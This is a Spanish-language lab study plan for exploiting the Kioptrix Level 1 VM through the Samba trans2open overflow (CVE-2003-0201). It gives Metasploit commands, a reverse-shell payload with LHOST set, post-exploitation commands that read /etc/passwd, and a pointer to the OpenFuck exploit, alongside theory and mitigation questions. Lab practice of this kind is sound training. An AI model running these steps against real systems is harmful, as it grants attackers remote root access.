# Sesión 004 — Explotación: Kioptrix L1 vía Samba trans2open

> Modo profesor: material exacto primero, ejecución después.
> Primera explotación real del portfolio. Objetivo: 192.168.56.102
> (VM propia en VirtualBox, red host-only — entorno autorizado).

## Situación actual

- Sesión 003 cerrada: enum completa documentada en
  `labs/kioptrix/level-1-enumeracion.md`.
- Hipótesis #1 del ranking: Samba 2.2.1a → trans2open (CVE-2003-0201),
  RCE remoto como root.

## Material de estudio (exacto, ver ANTES de explotar)

1. **TCM — Practical Ethical Hacking (YouTube)**:
   https://www.youtube.com/watch?v=3Kq1MIfTWCE
   - Sección "Exploitation Basics" — cómo piensa un pentester la fase.
2. **Rapid7 docs del módulo** (leer la descripción del módulo una vez
   dentro de msfconsole con `info`).
3. Referencia CVE: https://nvd.nist.gov/vuln/detail/CVE-2003-0201
   - Solo leer la descripción: qué es un buffer overflow en
     `call_trans2open` y por qué da ejecución remota.

## Conceptos clave (teoría mínima)

- **Buffer overflow**: el programa copia datos sin validar tamaño en un
  buffer de memoria fijo; el atacante sobreescribe la dirección de
  retorno y desvía la ejecución a su payload.
- **Payload vs exploit**: el exploit es el vehículo (trans2open); el
  payload es lo que corre después (una shell reversa).
- **Reverse shell**: la víctima se conecta de vuelta al atacante. Se usa
  porque el firewall suele permitir conexiones salientes.
- **Root directo**: smbd corría como root en Samba 2.2.x → el exploit
  da shell de root sin escalada de privilegios.

## Práctica (entregables)

### Paso 0 — instalación de Metasploit (si falta)

```bash
sudo pacman -S --needed metasploit
```

### Paso 1 — explotación guiada

```bash
msfconsole -q
```

Dentro de msfconsole:

```
search trans2open
use exploit/linux/samba/trans2open
info                          # LEER: qué hace, targets, opciones
show options
set RHOSTS 192.168.56.102
show payloads
run
```

Anotar TODO lo que pasa: qué dice el módulo, qué direcciones prueba,
qué payload usa por defecto.

### Paso 2 — verificación post-explotación

Si abre sesión/shell:

```bash
id
whoami
hostname
cat /etc/passwd | head
```

### Paso 3 — análisis (lo que vale más que la shell)

Responder por escrito:

1. ¿Por qué este exploit da root directo y no un usuario común?
2. ¿Qué es un "target" en Metasploit y por qué este módulo a veces
   prueba varias direcciones (bruteforce del RET)?
3. ¿Qué pasaría en los logs de la víctima durante el ataque?
4. ¿Cómo se mitiga? (parche, deshabilitar SMB1, segmentación)

## Desafío extra

- Repetir con `set payload linux/x86/shell_reverse_tcp` + `set LHOST
  192.168.56.1` y comparar con el payload por defecto.
- Opcional (avanzado): intentar OpenFuck contra el 443 y documentar
  los errores de compilación — aprendizaje sobre exploits viejos.

## Entregable público

- `labs/kioptrix/level-1-explotacion.md` — writeup con: vector elegido
  y por qué, pasos, output real, respuestas del análisis, mitigaciones.
  Sin IPs de tu LAN real; la del lab (192.168.56.x) no es sensible.
- Actualizar `labs/tracking.md` → Kioptrix L1: COMPLETA.

## Criterio de cierre

- Shell de root verificada con `id` (output en el writeup).
- Respuestas del análisis escritas con palabras propias.
- Primera máquina completa del portfolio: enum + explotación.
